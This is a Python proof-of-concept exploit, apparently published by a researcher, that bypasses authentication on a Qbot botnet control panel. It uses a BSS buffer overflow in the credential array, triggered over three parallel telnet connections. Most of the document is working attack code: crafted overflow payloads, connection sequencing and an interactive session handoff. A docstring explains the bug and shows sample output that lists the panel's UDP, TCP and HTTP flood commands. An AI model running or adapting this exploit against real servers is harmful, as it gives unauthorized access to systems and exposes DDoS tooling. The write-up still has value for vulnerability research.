#!/usr/bin/python

import os
import sys
import telnetlib

'''

This is a Proof-of-Concept exploit for a BSS-based buffer overflow I found leading to Auth bypass on the Qbot botnet panel.

The vulnerability is pretty easy to exploit, lot of advantages

First of all, there is a Format strings vulnerability on server.c:318 that is fully exploitable
and unauthenticated, which is a good indicious of authentication bypass.

However it wasn't needed as the same line is a BSS-based buffer overflow that allows us to overwrite a very useful struct array
that contains the credentials loaded in memory.

Thanks to the parallelism we can bypass:

fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);

Which reset's the memory credentials each new client is connected.

So in the first round, as sprintf() stops when a NULL byte is found, we will fill the whole accounts[j].username
with data and same with accounts[j].password, then enter a NULL byte.

We know both username and password are buffer of 20 bytes, then we will enter 39 A's and a NULL byte to close the string.

Now we will, in the second connection enter a fake username and a NULL byte after it.

Now what do we have?

username entry with a fake username plus a NULL

password completly filled by A's and a NULL byte.

We now can authenticate normally with the corrupted credentials, ending up in the botnet panel

Output:

lockedbyte@pwn:~/Downloads/qbot$ cat login.txt 
pwn pwn
lockedbyte@pwn:~/Downloads/qbot$ python3 exploit.py 127.0.0.1 2122
[i] Qbot botnet authentication bypass exploit - @lockedbyte [i]
[*] Connecting to 127.0.0.1:2122 for memory corrupt...
[*] Connecting to 127.0.0.1:2122 for authentication...
[*] Connecting to 127.0.0.1:2122 for bypass user...
[*] Corrupting BSS buffer...
[*] Logging in...
[*] Using corrupted data as credential...
[+] Authentication bypassed. We are now in!
 
   **     **              **          
  /**    /**             //           
  /**    /**   *******    **   **   **
  /**    /*   //**///**  /**  //** ** 
  /**    /**   /**  /**  /**   //***  
  /**    /**   /**  /**  /**    **/** 
  //*******    ***  /**  /**   ** //**
   ///////    ///   //   //   //   // 

        #----- Bot Count: 0 -----#

    #-------- Welcome, faked --------#
Type: HELP
   
#--- COMMANDS ---#

   - UDP - !* UDP Victim Port Time 32 0 10
   - TCP - !* TCP Victim Port Time 32 all 0 10
   - HTTP - !* HTTP Url Time
   - CNC - !* CNC IP PORT TIME
   - Kills Attack - KILL
   - Bot Count - BOTS
   - Clear Screen - CLEAR
   - LOGOUT - LOGOUT
   - TOS - TOS
   
Type: 


'''

print('[i] Qbot botnet authentication bypass exploit - @lockedbyte [i]')

if(len(sys.argv) < 3):
	print('Usage: python ' + str(sys.argv[0]) + ' <target ip> <target port>')
	exit()

HOST = sys.argv[1]
PORT = int(sys.argv[2])

MAX_SIZE = 1024*1024

offset = 0x20

fill_all = b''
fill_all += b'\x41'*0x27
fill_all += b'\x00'
fill_all += b'\x0a'

payload = b''
payload += b'faked'
payload += b'\x00'
payload += b'\x0a'

u_log = b''
u_log += b'faked'
u_log += b'\x00'
u_log += b'\x0a'

fake_pwd = b''
fake_pwd += b'\x41'*0x13
fake_pwd += b'\x00'
fake_pwd += b'\x0a'

print('[*] Connecting to ' + str(HOST) + ':' + str(PORT) + ' for memory corrupt...')
try:
	s1 = telnetlib.Telnet(HOST, PORT)
except:
	print('[-] Error while connecting to target.')
	exit()

print('[*] Connecting to ' + str(HOST) + ':' + str(PORT) + ' for authentication...')

try:
	s2 = telnetlib.Telnet(HOST, PORT)
except:
	print('[-] Error while connecting to target.')
	exit()
	
print('[*] Connecting to ' + str(HOST) + ':' + str(PORT) + ' for bypass user...')
try:
	s3 = telnetlib.Telnet(HOST, PORT)
except:
	print('[-] Error while connecting to target.')
	exit()


s1.read_until(b'Username: ')

s2.read_until(b'Username: ')

s3.read_until(b'Username: ')

print('[*] Corrupting BSS buffer...')

s3.write(fill_all)

s2.write(payload)

s2.read_until(b'Password: ')

print('[*] Logging in...')

s1.write(u_log)

s1.read_until(b'Password: ')

print('[*] Using corrupted data as credential...')

s1.write(fake_pwd)

s3.close()
s2.close()

print('[+] Authentication bypassed. We are now in!')

s1.interact()
s1.close()

print('[+] Exploit completed!')
